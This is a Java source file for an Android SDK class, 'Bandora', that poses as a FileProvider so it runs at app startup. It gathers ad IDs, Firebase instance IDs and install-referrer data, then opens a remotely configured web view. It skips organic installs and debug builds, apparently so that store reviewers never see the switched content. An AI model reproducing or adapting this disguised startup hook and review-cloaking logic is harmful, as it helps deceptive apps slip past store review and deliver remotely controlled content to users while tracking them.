package com.ma.awsdk;

import static com.ma.awsdk.utils.Utils.fixUrl;
import static com.ma.awsdk.utils.Utils.getElapsedTimeInSeconds;

import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.RemoteException;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.AdjustEvent;
import com.adjust.sdk.OnDeviceIdsRead;
import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.ma.awsdk.models.DynamoCF;
import com.ma.awsdk.models.Params;
import com.ma.awsdk.observer.DynURL;
import com.ma.awsdk.observer.URLObservable;
import com.ma.awsdk.ui.AppFileActivity;
import com.ma.awsdk.utils.Constants;
import com.ma.awsdk.utils.Utils;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
    public static final String TAG = "BANDORA";
    public int activitiesCounter = 0;
    public boolean isLaunched = false;
    public Params webParams = new Params();
    private long SPLASH_TIME = 0;
    public Long timestamp;
    URLObservable ov;
    InstallReferrerClient referrerClient;

    @Override
    public boolean onCreate() {
        FirebaseApp.initializeApp(getContext());
        initAdjust();
        getGoogleInstallReferrer();

        Application app = (Application) Utils.makeContextSafe(getContext());
        app.registerActivityLifecycleCallbacks(this);

        //callDynamoURL();
        callURL();

        ov = new URLObservable(3);
        EventBus.getDefault().register(this);

        return super.onCreate();
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onMessageEvent(DynURL o) {
        runApp();
    }

    private void initAdjust() {

        String appToken = getContext().getString(R.string.adjust_token);
        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        AdjustConfig config = new AdjustConfig(getContext(), appToken, environment);

        config.setOnAttributionChangedListener(attribution -> {

            Utils.logEvent(getContext(), Constants.adjust_attr_received_in_ + getElapsedTimeInSeconds(timestamp), "");

            if (attribution != null) {
                webParams.setAdjustAttribution(attribution.toString());
            }
        });

        config.setOnDeeplinkResponseListener(deeplink -> {

            webParams.setDeeplink(deeplink.toString());
            return false;
        });

        Adjust.getGoogleAdId(getContext(), new OnDeviceIdsRead() {
            @Override
            public void onGoogleAdIdRead(String googleAdId) {
                webParams.setGoogleAdId(googleAdId);
            }
        });

        //config.setDelayStart(2);
        Adjust.onCreate(config);

        timestamp = System.nanoTime();
        Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(getContext()));

        String versionCode = BuildConfig.VERSION;

        Adjust.addSessionCallbackParameter("m_sdk_version", versionCode);
        Utils.logEvent(getContext(), Constants.m_sdk_version + versionCode, "");

        try {
            FirebaseAnalytics.getInstance(getContext()).getAppInstanceId().addOnCompleteListener(task -> {

                webParams.setFirebaseInstanceId(task.getResult());
                ov.api_should_start();

                Adjust.addSessionCallbackParameter("Firebase_App_InstanceId", task.getResult());
                Adjust.sendFirstPackages();

                AdjustEvent adjustEvent = new AdjustEvent(getContext().getString(R.string.f_event_token));
                adjustEvent.addCallbackParameter("eventValue", task.getResult());
                adjustEvent.addCallbackParameter("user_uuid", Utils.generateClickId(getContext()));
                Adjust.trackEvent(adjustEvent);

                Utils.logEvent(getContext(), Constants.firbase_instanceid_sent, "");
            });
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void getGoogleInstallReferrer() {

        referrerClient = InstallReferrerClient.newBuilder(getContext()).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                switch (responseCode) {
                    case InstallReferrerClient.InstallReferrerResponse.OK:
                        try {
                            generateInstallReferrer();
                        } catch (RemoteException e) {
                            e.printStackTrace();
                            Utils.logEvent(getContext(), Constants.google_ref_attr_remote_except, "");
                        }
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                        // API not available on the current Play Store app.
                        Utils.logEvent(getContext(), Constants.google_ref_attr_error_feature_not_supported, "");
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                        // Connection couldn't be established.
                        Utils.logEvent(getContext(), Constants.google_ref_attr_error_service_unavailable, "");
                        break;
                }
            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
                Utils.logEvent(getContext(), Constants.google_ref_attr_error_service_disconnected, "");
            }
        });

    }

    public void generateInstallReferrer() throws RemoteException {
        try {
            Utils.logEvent(getContext(), Constants.google_ref_attr_received_in_ + getElapsedTimeInSeconds(timestamp), "");
            ReferrerDetails response = this.referrerClient.getInstallReferrer();
            webParams.setGoogleAttribution(response.getInstallReferrer());

        } catch (Exception e) {
            e.printStackTrace();
            Utils.logEvent(getContext(), Constants.google_ref_attr_received_exception, "");
        }
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {

        activitiesCounter++;

        if (activitiesCounter == 1 && !isLaunched) {
            ov.api_should_start();
        }
    }

    public void callURL() {

        String endURL = getContext().getString(R.string.finalEndp);

        if (endURL != null && !endURL.equals("")) {
            Constants.showAds = false;
            if (endURL.startsWith("http")) {
                Constants.setEndP(getContext(), endURL);
            } else {
                Constants.setEndP(getContext(), "https://" + endURL);
            }

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                ov.api_should_start();
            }, 2);
        }
    }

    public void callDynamoURL() {

        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url(fixUrl(getContext().getString(R.string.finalEndp)) + "/?package=" + getContext().getPackageName())
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Utils.logEvent(getContext(), Constants.init_dynamo_error, "");
                AppMainActivity();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                String myResponse = response.body().string();

                try {
                    Gson gson = new Gson();
                    DynamoCF m = gson.fromJson(myResponse, DynamoCF.class);

                    if (m != null & m.getCf() != null) {

                        Utils.logEvent(getContext(), Constants.init_dynamo_ok, "");

                        String fileResult = null;
                        try {
                            fileResult = m.getCf();

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        if (fileResult != null && !fileResult.equals("")) {
                            Constants.showAds = false;
                            if (fileResult.startsWith("http")) {
                                Constants.setEndP(getContext(), fileResult);
                            } else {
                                Constants.setEndP(getContext(), "https://" + fileResult);
                            }

                            try {
                                if (m.getSecond() != null) {
                                    SPLASH_TIME = 0;

                                    try {
                                        SPLASH_TIME = Integer.parseInt(m.getSecond());
                                    } catch (NumberFormatException nfe) {
                                        System.out.println("Could not parse " + nfe);
                                    }

                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                ov.api_should_start();
                            }, SPLASH_TIME);

                        } else {
                            AppMainActivity();
                        }
                    } else {
                        Utils.logEvent(getContext(), Constants.init_dynamo_ok_empty, "");
                        AppMainActivity();
                    }

                } catch (Exception e) {
                    Utils.logEvent(getContext(), Constants.init_dynamo_ok_exception, "");
                    AppMainActivity();
                }

            }
        });
    }

    public void runApp() {
        Utils.logEvent(getContext(), Constants.sdk_start + "_in" + getElapsedTimeInSeconds(timestamp), "");
        Intent intent = new Intent(getContext(), AppFileActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("webParams", webParams);

        String attribution = webParams.getGoogleAttribution();
        if (!BuildConfig.DEBUG) {
            if (attribution == null || attribution.isEmpty() || attribution.toLowerCase().contains("organic")) {
                return;
            }
        }
        getContext().startActivity(intent);
    }

    public void AppMainActivity() {
        //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
        return;
    }

    @Override
    public void onActivityStarted(@NonNull Activity activity) {
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Adjust.onResume();
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Adjust.onPause();
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
    }
}
